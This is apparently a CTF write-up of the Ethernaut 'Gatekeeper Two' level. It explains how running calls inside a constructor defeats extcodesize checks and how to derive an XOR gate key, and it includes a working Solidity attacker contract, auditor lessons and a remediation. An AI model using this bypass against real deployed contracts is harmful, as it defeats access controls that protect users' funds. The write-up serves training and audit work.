---
title: 'Ethernaut - Gatekeeper Two'
description: 'Bypassing extcodesize checks and solving bitwise XOR constraints. Learn how the EVM manages code size during constructor initialization and how to derive cryptographic gatekeys.'
date: 2025-07-14
tags: ['solidity', 'security', 'bitwise', 'constructor-execution', 'gatekeeper', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🚪 Gatekeeper Two - The Initialization Loophole

## Challenge Overview

The goal of this level is to bypass **three security gates** to register our address as the `entrant` of the `GatekeeperTwo` contract.

**The Catch:**
1. **Gate One** checks the transaction caller source.
2. **Gate Two** utilizes the `extcodesize` opcode to ensure that the calling address contains **no contract code** (blocking smart contract calls).
3. **Gate Three** checks a `bytes8` key utilizing a bitwise XOR ($\wedge$) operation against the hash of the caller.

---

## Technical Analysis

Let's examine the three gates in `GatekeeperTwo.sol`:

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}

modifier gateTwo() {
    uint256 x;
    assembly {
        x := extcodesize(caller())
    }
    require(x == 0);
    _;
}

modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
```

---

### Gate One: Origin Verification
Like the previous level, we must execute the attack using an intermediate attacker contract so that `msg.sender != tx.origin`.

---

### Gate Two: Code Size Checking (`extcodesize`)
*   **The Check**: The contract uses inline assembly `extcodesize(caller())` to read the size of the calling address's compiled code, requiring it to be `0`.
*   **The Flaw**: In Ethereum, a contract's code is only written to its address **after** its constructor code finishes executing. During the execution of the **`constructor()`**, the contract's address exists, but `extcodesize` returns **0**!
*   **The Bypass**: If we execute the entire exploit within the `constructor()` of our attacker contract, the `extcodesize` check will evaluate to `0`, successfully bypassing the gate.

---

### Gate Three: XOR Bitwise Complement
*   **The Check**:
    ```solidity
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    ```
*   **The Math**:
    Let $A$ be `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`, let $B$ be `uint64(_gateKey)`, and let $C$ be `type(uint64).max` (which is `0xFFFFFFFFFFFFFFFF`, representing all 1s).
    The equation is:
    $$A \wedge B = C$$
    In bitwise XOR operations, if $A \wedge B = C$, then $B = A \wedge C$.
    XORing any value with `0xFFFFFFFFFFFFFFFF` is equivalent to a bitwise NOT operation ($\sim$ or bitwise negation).
    Therefore:
    $$B = \sim A$$
    In Solidity:
    ```solidity
    uint64 gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    ```
    *(Note: `msg.sender` inside Gatekeeper Two will be our attacker contract's address, so we use `address(this)` in the calculation).*

---

## The Exploit: The Multi-Step Solution

1. **Deploy an Attack Contract**: Develop a contract that performs the entire attack sequence within its `constructor()`.
2. **Calculate the Gate Key**: In the constructor, calculate the exact complement key based on `address(this)`.
3. **Execute the Entry**: Call `enter(gateKey)` directly on the target contract within the constructor body.

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    constructor(address _target) {
        IGatekeeperTwo target = IGatekeeperTwo(_target);

        // 1. Calculate the cryptographic complement key based on our contract address
        uint64 callerHash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        
        // Bitwise NOT operation satisfies the XOR condition
        bytes8 gateKey = bytes8(~callerHash);

        // 2. Execute the entry inside the constructor
        // This bypasses gateTwo since our extcodesize is still 0
        require(target.enter(gateKey), "Entry failed");
    }
}
```

To run the exploit, deploy `GatekeeperTwoAttacker` in Remix, passing the `GatekeeperTwo` instance address. Since all logic runs in the constructor, you are registered as the entrant immediately upon deployment!

---

## Auditor's Lessons

1. **`extcodesize` is Not a Reliable EOA check**: Never rely on `extcodesize == 0` to verify if an address is a human EOA. It is highly exploitable by executing logic during contract construction.
2. **Use `msg.sender == tx.origin` for EOA Checks (With Caution)**: If you must absolutely prevent contract calls, use `msg.sender == tx.origin`. Be aware that this pattern is highly discouraged as it breaks compatibility with ERC-4337 smart wallets (Safe, Argent).
3. **XOR Cryptographic Weakness**: Plain XOR checks against easily reproducible hashes are highly deterministic. They provide zero real security against determined attackers.

---

## Remediation

Remove assembly-level `extcodesize` checks and secure the entry function using robust access controls rather than obscure bitwise validations:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureGatekeeperTwo is Ownable {
    address public entrant;

    constructor() Ownable(msg.sender) {}

    // Secure, explicit role authorization
    function enter(address _newEntrant) external onlyOwner {
        entrant = _newEntrant;
    }
}
```
